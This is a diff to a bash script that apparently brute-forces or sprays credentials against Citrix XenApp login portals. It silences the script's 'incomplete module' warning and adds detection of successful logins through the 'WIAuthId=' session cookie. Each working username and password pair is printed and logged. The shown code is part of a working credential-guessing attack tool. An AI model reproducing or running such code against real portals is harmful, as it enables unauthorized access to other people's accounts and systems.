@@ -3,8 +3,9 @@
 check_XenApp(){
 	check_Portal=$(wget --timeout=4 -qO- https://$1/Citrix/XenApp/auth/login.aspx --no-check-certificate);
 	if ([ "$(echo $check_Portal | grep 'XenApp' )" ]) || [[ $(echo "$5" | tr '[:upper:]' '[:lower:]' ) == "disable_check" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "disable_check" ]]; then
-			echo "";
-			echo "***This Module for XenApp is incomplete and might show false positives, recommended to run with DEBUG***";
+			:			
+			#echo "";
+			#echo "***This Module for XenApp is incomplete and might show false positives, recommended to run with DEBUG***";
 	else
 		echo "Either not an XenApp portal, or not compatible version.";
 		echo "Exiting...";
@@ -71,7 +72,12 @@ fi
 			echo "-------------------------------------------------------------" >> "$DEBUG";	
 		fi
 			#checks cookie to see if successful login
-			if [[ $POST == *"InvalidCredentials"* ]]; then
+			if [[ $POST == *"WIAuthId="* ]]; then
+				echo "	$line:$pass:Success";
+			if [[ $LOG_YES == true ]]; then
+				echo "	$line:$pass:Success" >> "$LOG";
+			fi
+			elif [[ $POST == *"InvalidCredentials"* ]]; then
 				echo "	$line:$pass:Fail";
 			if [[ $LOG_YES == true ]]; then
 				echo "	$line:$pass:Fail" >> "$LOG";
